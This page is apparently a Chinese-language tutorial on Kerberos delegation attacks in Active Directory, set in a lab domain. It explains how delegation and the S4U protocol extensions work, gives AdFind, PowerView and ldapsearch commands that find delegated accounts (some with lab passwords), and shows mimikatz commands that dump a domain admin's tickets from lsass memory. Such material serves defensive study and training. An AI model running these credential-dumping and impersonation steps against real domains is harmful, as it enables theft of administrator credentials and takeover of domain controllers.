+<p><strong>从网络攻击者的角度来看，如果攻击者控制了 service1，则攻击者可以诱骗域管理员来访问 service1 服务，然后攻击者可以在 service1 机器上获取域管理员的TGT 认购权证，从而攻击者可以用缓存的 TGT 认购权证模拟管理员访问任意服务，包括域控。</strong></p>
+<h3 id="2">2.约束性委派<a class="headerlink" href="#2" title="Permanent link">&para;</a></h3>
+<p>由于非约束性委派的不安全性，微软在 Windows Server 2003 中发布了约束性委派。对于<code>约束性委派（Constrained Delegation）</code>，服务账号只能获取该用户对指定服务的 ST 服务票据，从而只能模拟该用户访问特定的服务。配置了约束性委派账户的<code>msDS-AllowedToDelegateTo</code>属性会指定对哪个<code>SPN</code>进行委派。约束委派的设置需要<code>SeEnableDelegationPrivilege</code>特权，该特权默认仅授予域管理员和企业管理员。</p>
+<p>约束性委派有两种：</p>
+<ul>
+<li>
+<p>一种是仅使用 Kerberos(K)，也就是不能进行协议转换，如图所示。</p>
+</li>
+<li>
+<p>另一种是使用任何身份验证协议(N)，也就是能进行协议转换，如图所示。</p>
+</li>
+</ul>
+<p><img alt="截图" src="d6093c337c340f97d15ccbc9f54b6037.png" /></p>
+<p><img alt="截图" src="b9e9b337920716470d3c0b743dc2a4ab.png" /></p>
+<h4 id="_5">约束性委派流程<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
+<p>为了在 Kerberos 协议层面对约束性委派的支持，微软对 Kerberos 协议扩展了两个子协议 <code>S4u2self(Service for User to Self)</code>和 <code>S4u2Proxy (Service for User to Proxy )</code><strong>。<code>S4u2self</code> 可以代表任意用户请求针对自身的 ST 服务票据；<code>S4u2Proxy</code> 可以用上一步获得的 ST 服务票据以用户的名义请求针对其它指定服务的 ST 服务票据。</strong></p>
+<p>如图所示是微软官方对于使用任何身份验证协议(N)约束性委派流程的介绍：</p>
+<p><img alt="截图" src="8abc3b74c3519c3c6cd285adbe7ced0c.png" /></p>
+<p>从网络攻击的角度来看，如果攻击者控制了 <code>Service1</code> 的服务账号，并且<code>Service1</code>配置了到域控的 <code>CIFS</code> 服务的约束性委派。则攻击者可以利用 <code>Service1</code> 以任意用户权限(包括域管理员)访问域控的 <code>CIFS</code> 服务，即相当于控制了域控。</p>
+<p>整个流程简化点概括如下图所示：</p>
+<p><img alt="截图" src="a75c6a8a6c31e49fed770f9b08c8c933.png" /></p>
+<h5 id="1s4u2self">1）S4u2Self<a class="headerlink" href="#1s4u2self" title="Permanent link">&para;</a></h5>
+<p><strong>S4u2self 可以代表任意用户请求针对自身的可转发 ST 服务票据。</strong>当用户以其他方式：如 NTLM 认证、基于表单的认证等方式与 Web 服务进行认证后，用户是无法向 Web 服务器提供请求该服务的 ST 服务票据。因而服务器也无法进一步使用<code>S4U2Proxy</code>协议请求访问服务 B。<code>S4U2Self</code>协议便是解决该问题的方案，被配置为约束性委派的服务账号能够调用<code>S4U2Self</code>协议向 KDC 申请为任意用户请求访问自身的可转发的服务票据。此后，便可通过 <code>S4U2Proxy</code> 协议以指定用户的身份使用这张可转发的 ST 服务票据向域控制器请求访问服务 B 的 ST 服务票据。需要特别说明的是，服务使用<code>S4U2Proxy</code>协代表用户获得针对服务自身 ST 票据这个过程是不需要用户凭据的！如图所示，是<code>S4u2self</code>的过程：</p>
+<p><img alt="截图" src="c2336d7be2f5353a561be1339bd425d2.png" /></p>
+<p>注：虽然 S4U2Self 协议允许服务代表用户向 KDC 请求一张访问自身服务的 ST服务票据，但是此协议扩展不允许服务代表用户向 KDC 请求访问其他服务的 ST服务票据。</p>
+<h5 id="2s4u2proxy">2）S4u2Proxy<a class="headerlink" href="#2s4u2proxy" title="Permanent link">&para;</a></h5>
+<p><strong>S4u2Proxy 可以用上一步获得的可转发 ST 服务票据以用户的名义请求针对其它指定服务的 ST 服务票据。</strong>S4U2Proxy 使得服务 A 可以使用来自用户 test 的授权，然后以用户 test 的身份向 KDC 请求访问服务 B 的 ST 服务票据。如图所示，是<code>S4u2Proxy</code>的过程：</p>
+<p><img alt="截图" src="884a07e5a295f7a7fd4186ad48731382.png" /></p>
+<h3 id="3">3.基于资源的约束性委派<a class="headerlink" href="#3" title="Permanent link">&para;</a></h3>
+<p>为了使用户和资源更加独立，微软在 <code>Windows Server 2012</code> 中引入了基于资源的约束性委派。<strong>基于资源的约束委派不需要域管理员权限去设置，而是把设置属性的权限赋予给了机器自身。基于资源的约束性委派允许资源配置受信任的帐户委派给他们。</strong>基于资源的约束性委派只能在运行 Windows Server 2012 和 Windows Server 2012 R2 及以上的域控制器上配置，但可以在混合模式林中应用。配置了基于资源的约束性委派账户的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性的值为被允许委派账号的 SID，如图所示。</p>
+<p><img alt="截图" src="bd348b7457f73bed35c8e02dcdef8d89.png" /></p>
+<p>并且委派属性这里没有任何值，如图所示。</p>
+<p><img alt="截图" src="b87e119b7f6906f2eda12002e63cecd7.png" /></p>
+<h4 id="1_1">（1）基于资源的约束性委派流程<a class="headerlink" href="#1_1" title="Permanent link">&para;</a></h4>
+<p>基于资源的约束性委派简要流程如图所示：</p>
+<p><img src="059f8ade785f44594ce60e48fec8fc18.png" alt="截图" style="zoom:150%;" /></p>
+<p>整个流程如下：
+①：服务 A 使用自己的服务账号密码向 KDC 申请一个可转发的 TGT 认购权证。
+②：服务 A 利用<code>S4U2Self</code>协议代表用户申请一个获得针对服务 A 自身的 ST 服务票据。这一步区别于传统的约束性委派。在 <code>S4U2Self</code>协议里面提到，返回的 ST服务票据可转发的一个条件是服务 A 配置了传统的约束委派。KDC 会检查服务 A的 <code>msDS-AllowedToDelegateTo</code> 字段，如果这个字段赋值了，则 KDC 返回可转发的 ST 服务票据。但是由于这里是基于资源的约束性委派，是在服务 B 上配置的，服务 B 的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性配置了服务 A的 SID，因此服务 A 并没有配置 <code>msDS-AllowedToDelegateTo</code>字段。因此 KDC返回的 ST 服务票据是不可转发的。
+③：服务 A 利用 <code>S4U2Proxy</code> 协议以用户的身份向 KDC 请求访问针对服务 B 的可转发的 ST 服务票据(上一步获得的不可转发的 ST 服务票据放在请求包的<code>AddtionTicket</code> 里面)。KDC 返回一张访问服务 B 的可转发的 ST 服务票据。
+④：服务 A 拿着上一步获得的可转发的 ST 服务票据访问服务 B。</p>
+<h4 id="2_1">（2）谁拥有配置基于资源的约束性委派的权限？<a class="headerlink" href="#2_1" title="Permanent link">&para;</a></h4>
+<p>从上面我们知道，配置了基于资源的约束性委派账户的 <code>msDS- AllowedToActOnBehalfOfOtherIdentity</code> 属性的值为被允许委派账号的 SID。那么，谁能修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性，就说明谁拥有配置基于资源的约束性委派的权限了！</p>
+<p>在域控上执行如下命令查询指定域内机器 win2012R2 的 <code>msDS- AllowedToActOnBehalfOfOtherIdentity</code> 属性。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>AdFind.exe -f &quot;&amp;(objectcategory=computer)(name=win2012R2)&quot; msDS-AllowedToActOnBehalfOfOtherIdentity
+</code></pre></div>
+<p>如图所示，查询域内机器 win2012R2 的 <code>msDS- AllowedToActOnBehalfOfOtherIdentity</code> 属性，发现默认情况下，没有该属性。</p>
+<p><img alt="截图" src="c1b7deb4d4c4b77118d20800eb5aded2.png" /></p>
+<p>也就是说，<strong>谁能增加机器账户的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性，就说明谁能配置基于资源的约束性委派。</strong>我们使用 adfind 查询 win2012R2机器的 <strong>ACL</strong>，看哪些用户对其有修改属性的权限，查询命令如下所示</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>adfind.exe -b CN=WIN2012R2,CN=Computers,DC=xie,DC=com -sc getacl -sddl+++ -sddlfilter ;;&quot;WRT PROP&quot;;;;
+</code></pre></div>
+<p>如图所示，可以看出除了 administrator 用户外，xie\hack 用户和 SELF 自身拥S有修改属性的权限。</p>
+<p><img src="051ddbfaea607ef81a75eb77d73ae100.png" alt="截图" style="zoom:150%;" /></p>
+<p>administrator 和 SELF 自身拥有修改属性权限好理解，那么为啥 <code>xie\hack</code> 用户也拥有修改属性的权限呢？这是<strong>因为 win2012R2 机器是通过 <code>xie\hack</code> 用户加入域的，因此 <code>xie\hack</code> 用户拥有修改 win2012R2 机器属性的权限。</strong>并且win2012R2 机器的 <code>mS-DS-CreatorSID</code> 属性的值为 <code>xie\hack</code> 用户的 SID，我们通过 adfind 执行如下命令查询可以验证该结论。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>#查询 win2012r2 机器的 mS-DS-CreatorSID 属性
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>AdFind.exe -f &quot;&amp;(objectcategory=computer)(name=win2012R2)&quot; mS-DS-CreatorSID
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>#查询 sid 对应的用户
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>AdFind.exe -sc adsid:S-1-5-21-1313979556-3624129433-4055459191-1105
+</code></pre></div>
+<p>如图所示，可以看到 win2012R2 机器的 <code>mS-DS-CreatorSID</code> 属性的值确实为<code>xie\hack</code> 用户的 SID。</p>
+<p><img alt="截图" src="00b061f8d558f29e02f328071accb9ec.png" /></p>
+<p><strong>结论：也就是说，除了传统的域管理员等高权限用户外，机器自身和将机器加入域的域用户拥有修改机器 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的权限。</strong></p>
+<h4 id="3_1">（3）基于资源的约束性委派的优势<a class="headerlink" href="#3_1" title="Permanent link">&para;</a></h4>
+<p>那么基于资源的约束性委派相比域其他两种类型的委派有啥优势呢？</p>
+<ul>
+<li><strong>委派的授予权限</strong>给了拥有资源的后端，而不是前端。</li>
+<li>约束性委派不能跨域进行委派，而基于资源的约束性委派<strong>可以跨域和林</strong>。</li>
+<li>不再需要<strong>域管理员</strong>权限设置，只需拥有在计算机对象上编辑<code>msDS- AllowedToActOnBehalfOfOtherIdentity</code>属性的权限，也就是 <strong>将计算机加入域的域用户</strong> 和 <strong>机器自身</strong> 都拥有该权限。</li>
+</ul>
+<h4 id="4">（4）约束性委派和基于资源的约束性委派配置的差别<a class="headerlink" href="#4" title="Permanent link">&para;</a></h4>
+<p>那么约束性委派和基于资源的约束性委派在配置上有何差别呢？</p>
+<ul>
+<li>传统的约束性委派是“<strong>正向的</strong>”，通过修改服务账户 A 的<code>msDS- AllowedToDelegateTo</code>属性，添加服务 B 的<code>SPN（Service Principle Name）</code>，设置约束委派对象为服务 B，服务 A 便可以模拟任意用户向域控制器请求访问服务 B 的 ST 服务票据。</li>
+<li>而基于资源的约束性委派则是<strong>相反</strong>，通过修改服务 B 的<code>msDS- AllowedToActOnBehalfOfOtherIdentity</code>属性，添加服务 A 的 <code>SID</code>，达到让服务 A 模拟任意用户访问服务 B 资源的目的。</li>
+</ul>
+<p>如图所示，可以看到两者配置的差别：</p>
+<p><img alt="截图" src="78ac49f1ef239d9c5ad9d37a57732e09.png" /></p>
+<h4 id="5">（5）基于资源的约束性委派攻击<a class="headerlink" href="#5" title="Permanent link">&para;</a></h4>
+<p>该攻击由国外安全研究员 Elad Shami 提出，他在文章中指出无论服务账号的<code>UserAccountControl</code> 属性是否被设置为<code>TRUETED_TO_AUTHENTICATE_FOR_DELEGATION</code> 值，服务自身都可以通过调用 <code>S4U2Self</code> 来为任意用户请求自身的服务票据。但是当没有设置该属性时，KDC 通过检查账号的 <code>msDS-AllowedToDelegateTo</code> 字段，发现没有被赋值，所以服务自身通过<code>S4U2Self</code>请求到的 ST 服务票据是不可转发的，因此不可转发的ST 服务票据是无法通过<code>S4U2Proxy</code>协议转发到其他服务进行约束性委派认证的。<strong><em>但是！在基于资源的约束性委派过程中，不可转发的 ST 服务票据仍然可以通过 <code>S4U2Proxy</code> 协议转发到其他服务进行委派认证，并且最后服务还会返回一张可转发的 ST 服务票据，这是微软的设计缺陷！</em></strong>因此，<u>如果我们能够在服务 B 上配置允许服务 A 的基于资源的约束性委派，那么我们就可以通过控制服务 A 使用<code>S4U2Self</code> 协议向域控请求任意用户访问自身的 ST 服务票据，最后再使用<code>S4U2Proxy</code> 协议转发此 ST 服务票据去请求访问服务 B 的可转发的 ST 服务票据，那么我们就可以模拟任意用户访问服务 B 了。而这里我们控制的服务 A 可以以普通域用户的身份去创建机器账号。</u></p>
+<p>引用博客文章中的一张图说明该攻击步骤，如图所示：</p>
+<p><img alt="截图" src="623f9f34a7d86b8e78feab57c00ffe8a.png" /></p>
+<p>要想进行基于资源的约束性委派攻击，需要具备下面两个条件：</p>
+<ul>
+<li>拥有服务 A 的权限，这里我们只需要拥有一个普通的域账号权限即可，因为普通的域账户默认可以创建最多十个机器账号。机器账号可以作为服务账号使用。</li>
+<li>拥有在服务 B 上配置允许服务 A 的基于资源的约束性委派的权限，即拥有修改服务 B 的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性的权限。而机器账号自身和创建机器账号的用户即拥有该权限。</li>
+</ul>
+<p>所以，以上两个条件可以转换为拥有 <strong>将机器加入域的域用户的权限</strong> 或 <strong>机器自身的权限</strong>。</p>
+<h2 id="_6">查询委派属性的账号<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<p>查询域中具有委派属性的账号可以<strong>使用 LDAP 协议</strong>，通过过滤<code>userAccountControl</code> 属性筛选出服务账号和机器账号，机器账号<code>samAccountType=805306369</code>，而服务账号 <code>samAccountType=805306368</code>。再通过 <code>allowedtodelegateto</code> 和 <code>AllowedToActOnBehalfOfOtherIdentity</code> 属性筛选出不同的委派。</p>
+<h3 id="1_2">1.查询非约束委派的主机或服务账户<a class="headerlink" href="#1_2" title="Permanent link">&para;</a></h3>
+<p>查询非约束性委派的主机或服务账号可以使用 powershell 脚本、adfind 或ldapsearch 等工具。</p>
+<h4 id="1powershell">（1）powershell 脚本<a class="headerlink" href="#1powershell" title="Permanent link">&para;</a></h4>
+<p>利用 PowerSploit 下的 PowerView.ps1 脚本查询，使用命令如下：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>Import-Module .\PowerView.ps1;
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>#查询域中配置非约束委派的主机
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>Get-NetComputer -Unconstrained -Domain xie.com
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>#查询域中配置非约束委派的服务账户
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>Get-NetUser -Unconstrained -Domain xie.com | select name
+</code></pre></div>
+<p>如图所示，使用该脚本查询出域中配置了非约束性委派的主机有 AD01 和 AD02，配置了非约束性委派的服务账号有 service_account。</p>
+<p><img alt="截图" src="4891a300415d1750bc92029294175675.png" /></p>
+<h4 id="2adfind">（2）adfind<a class="headerlink" href="#2adfind" title="Permanent link">&para;</a></h4>
+<p>利用 adfind 执行如下命令过滤 samAccountType 和 userAccountControl 属性，即可查询出域内配置了非约束性委派的主机和服务账号。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>#查询域中配置非约束委派的主机
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>AdFind.exe -b &quot;DC=xie,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>#查询域中配置非约束委派的服务账户
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>AdFind.exe -b &quot;DC=xie,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn
+</code></pre></div>
+<h4 id="3ldapsearch">（3）ldapsearch<a class="headerlink" href="#3ldapsearch" title="Permanent link">&para;</a></h4>
+<p>利用 ldapsearch 执行如下命令过滤 samAccountType 和 userAccountControl属性，即可查询出域内配置了非约束性委派的主机和服务账号。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>#查询域中配置非约束委派的主机
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>ldapsearch -x -H ldap://10.211.55.4:389 -D &quot;hack@xie.com&quot; -w P@ss1234 -b &quot; DC=xie,DC=com&quot; &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; | grep dn
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>#查询域中配置非约束委派的服务账户
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>ldapsearch -x -H ldap://10.211.55.4:389 -D &quot;hack@xie.com&quot; -w P@ss1234 -b &quot; DC=xie,DC=com&quot; &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; | grep dn
+</code></pre></div>
+<h3 id="2_2">2.查询约束性委派的主机或服务账户<a class="headerlink" href="#2_2" title="Permanent link">&para;</a></h3>
+<p>查询非约束性委派的主机或服务账号可以使用 powershell 脚本、adfind 或ldapsearch 等工具。</p>
+<h4 id="1powershell_1">（1）powershell 脚本<a class="headerlink" href="#1powershell_1" title="Permanent link">&para;</a></h4>
+<p>利用 Empire 下的 powerview.ps1 脚本，使用命令如下：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>Import-Module .\powerview.ps1;
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>#查询域中配置了约束性委派的主机
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>Get-DomainComputer -TrustedToAuth -Domain xie.com | select name,msds-allowedtodelegateto
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>#查询域中配置了约束性委派的账号
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>Get-DomainUser -TrustedToAuth -Domain xie.com | select name,msds-allowedtodelegateto
+</code></pre></div>
+<h4 id="2adfind_1">（2）adfind<a class="headerlink" href="#2adfind_1" title="Permanent link">&para;</a></h4>
+<p>利用 adfind 执行如下命令过滤 samAccountType 和 userAccountControl 属性，即可查询出域内配置了约束性委派的主机和服务账号。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>#查询域中配置了约束性委派的主机，并可以看到被委派的 SPN
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>AdFind.exe -b &quot;DC=xie,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>#查询域中配置了约束性委派的服务账户，并可以看到被委派的 SPN
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>AdFind.exe -b &quot;DC=xie,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto
+</code></pre></div>
+<h4 id="3ldapsearch_1">（3）ldapsearch<a class="headerlink" href="#3ldapsearch_1" title="Permanent link">&para;</a></h4>
+<p>利用 ldapsearch 执行如下命令过滤 samAccountType 和 userAccountControl属性，即可查询出域内配置了约束性委派的主机和服务账号。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>#查询域中配置了约束性委派的主机，并可以看到被委派的 SPN
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>ldapsearch -x -H ldap://10.211.55.4:389 -D &quot;hack@xie.com&quot; -w P@ss1234 -b &quot; DC=xie,DC=com&quot; &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*)) &quot; | grep -e dn -e msDS-AllowedToDelegateTo
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>#查询域中配置了约束性委派的服务账户，并可以看到被委派的 SPN
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>ldapsearch -x -H ldap://10.211.55.4:389 -D &quot;hack@xie.com&quot; -w P@ss1234 -b &quot; DC=xie,DC=com&quot; &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*)) &quot; | grep -e dn -e msDS-AllowedToDelegateTo
+</code></pre></div>
+<h3 id="3_2">3.查询基于资源的约束性委派的主机或服务账户<a class="headerlink" href="#3_2" title="Permanent link">&para;</a></h3>
+<h4 id="1adfind">（1）adfind<a class="headerlink" href="#1adfind" title="Permanent link">&para;</a></h4>
+<p>利用 adfind 执行如下命令过滤 <code>samAccountType</code> 和 <code>msDS- AllowedToActOnBehalfOfOtherIdentity</code> 属性，即可查询出域内配置了基于资源的约束性委派的主机和服务账号。使用 adfind 查询出来的 <code>msDS- AllowedToActOnBehalfOfOtherIdentity</code> 值，用<code>{Security Descriptor}</code>代替了，这个值包含了允许被委派的服务账号或机器账号的 SID。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>#查询域中配置基于资源的约束性委派的主机
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>AdFind.exe -b &quot;DC=xie,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))&quot; msDS-AllowedToActOnBehalfOfOtherIdentity
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>#查询域中配置基于资源的约束性委派的服务账户
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>AdFind.exe -b &quot;DC=xie,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))&quot; msDS-AllowedToActOnBehalfOfOtherIdentity
+</code></pre></div>
+<p>如图所示，使用 adfind 查询出域中配置了基于资源的约束性委派的主机有win7，配置了基于资源的约束性委派的服务账号有 krbtgt。</p>
+<p><img src="c49b3f947f7a2867fd9a4387c9db3f59.png" alt="截图" style="zoom:150%;" /></p>
+<h4 id="2ldapsearch">（2）ldapsearch<a class="headerlink" href="#2ldapsearch" title="Permanent link">&para;</a></h4>
+<p>利用 ldapsearch 执行如下命令过滤 samAccountType 和 msDS- AllowedToActOnBehalfOfOtherIdentity 属性，即可查询出域内配置了基于资源的约束性委派的主机和服务账号。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>#查询域中配置基于资源的约束性委派的主机
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>ldapsearch -x -H ldap://10.211.55.4:389 -D &quot;hack@xie.com&quot; -w P@ss1234 -b &quot; DC=xie,DC=com&quot; &quot;(&amp;(samAccountType=805306369)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))&quot; | grep dn
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>#查询域中配置基于资源的约束性委派的服务账户
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>ldapsearch -x -H ldap://10.211.55.4:389 -D &quot;hack@xie.com&quot; -w P@ss1234 -b &quot; DC=xie,DC=com&quot; &quot;(&amp;(samAccountType=805306368)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))&quot; | grep dn
+</code></pre></div>
+<h3 id="4_1">4.查看某账户是否具有委派性<a class="headerlink" href="#4_1" title="Permanent link">&para;</a></h3>
+<p>通过使用 Empire 下的 powerview.ps1 脚本查看服务账号或机器账号的属性，来查看某账号是否具有委派属性。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>Import-Module .\powerview.ps1;
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>#查看非约束性委派和约束性委派
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>Get-DomainUser 域用户名 -Properties useraccountcontrol,msds-allowedtodelegateto | fl
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>Get-DomainComputer 机器用户名 -Properties useraccountcontrol,msds-allowedtodelegateto | fl
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>#查看基于资源的约束性委派
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>Get-DomainUser 域用户名 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>Get-DomainComputer 机器用户名 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+</code></pre></div>
+<p>当该账号没委派属性时，只有 userAccountControl 属性有值。</p>
+<p>• 服务账号的值为：NORMAL_ACCOUNT
+• 机器账号的值为：WORKSTATION_TRUST_ACCOUNT</p>
+<p>如图所示，可以看到没配置委派属性的服务账号的 userAccountControl 属性只有NORMAL_ACCOUNT，没配置委派属性的机器账号的 userAccountControl 属性只有 WORKSTATION_TRUST_ACCOUNT。</p>
+<p><img alt="截图" src="8cf52340eb6db186bd3c34037440fde5.png" /></p>
+<p>如图所示，当账号被设置为 非约束性委派 时，其 userAccountControl 属性会包含为 TRUSTED_FOR_DELEGATION。</p>
+<p><img alt="截图" src="c50b693da29337f19b9acd23d2df4688.png" /></p>
+<p>如图所示，当账号被设置为 约束性委派 时，其 userAccountControl 属性包含TRUSTED_TO_AUTH_FOR_DELEGATION，且 msds-allowedtodelegateto 属性会被设置为哪些 SPN。</p>
+<p><img alt="截图" src="4f836ef5cef75a99e41e9f5258e299f0.png" /></p>
+<p>如图所示，当账号被设置为 基于资源的约束性委派时，其 msDS- AllowedToActOnBehalfOfOtherIdentity 属性会有被允许委派账号的 SID。</p>
+<p><img alt="截图" src="2fd60ac46d7a656d74d94b9b4f3e776a.png" /></p>
+<h2 id="_7">域委派攻击<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
+<p>域委派攻击发生在 kerberos 协议的 <code>TGS-REQ&amp;TGS-REP</code> 阶段，可以分为非约束性委派攻击、约束性委派攻击和基于资源的约束性委派攻击。</p>
+<h3 id="1_3">1.非约束委派攻击<a class="headerlink" href="#1_3" title="Permanent link">&para;</a></h3>
+<p>以下是实验环境：</p>
+<ul>
+<li>域控：AD01(10.211.55.4) </li>
+<li>域成员主机：Win7(10.211.55.6) Server2012(10.211.55.9) </li>
+<li>域管理员：test administrator </li>
+<li>域普通用户：hack</li>
+<li>域：xie.com</li>
+</ul>
+<p>非约束性委派攻击可以利用服务账号和主机账号，因为只有服务账号和主机账号具有委派属性。<strong>域用户账号注册 SPN 之后就成为了服务账号，主机账号的话我们可以手动去创建。</strong></p>
+<p>如图所示，在域控上配置主机 win7 具有非约束性委派属性。</p>
+<p><img alt="截图" src="f5c9f1c78f4cbe76a8e6235afa73a0e2.png" /></p>
+<p>查看域内非约束性委派的主机账号，如图所示，可以看到有 Win7 机器。</p>
+<p><img alt="截图" src="b933167178f8550f9e41ae2975b629c5.png" /></p>
+<p>注：默认域控制器配置了非约束性委派。</p>
+<p>在 win7 上访问域控，提示拒绝访问。如图所示：</p>
+<p><img alt="截图" src="3d977232bd5e2ed1f3b09d2026cc1fa0.png" /></p>
+<h4 id="1_4">（1）诱使域管理员访问机器<a class="headerlink" href="#1_4" title="Permanent link">&para;</a></h4>
+<p>此时我们用域管理员 test 身份远程访问 win7 机器，这里 test 登录在域内任何一台机器均可，不一定非得是域控。或者也可以使用 ipc 连接，如下：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>net use \\win7.xie.com /user:xie\test P@ssword1234
+</code></pre></div>
+<p>如图域管理员 test 远程连接 win7 机器。</p>
+<p><img alt="截图" src="592a9bfe3538b2dbae8244314bcdbdad.png" /></p>
+<p><strong>此时，在主机 win7 的 lsass.exe 内存中就会有域管理员 test 的 TGT 认购权证</strong>。我们<strong>在 win7 上以管理员权限运行 mimikatz</strong>，执行以下命令导出内存中的票据：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>privilege::debug
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>#导出票据
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>sekurlsa::tickets /export
+</code></pre></div>
+<p>如图所示，使用 mimikatz 导出内存中的票据：</p>
+<p><img alt="截图" src="105dd9acf13477bd8950a75f89b2769a.png" /></p>
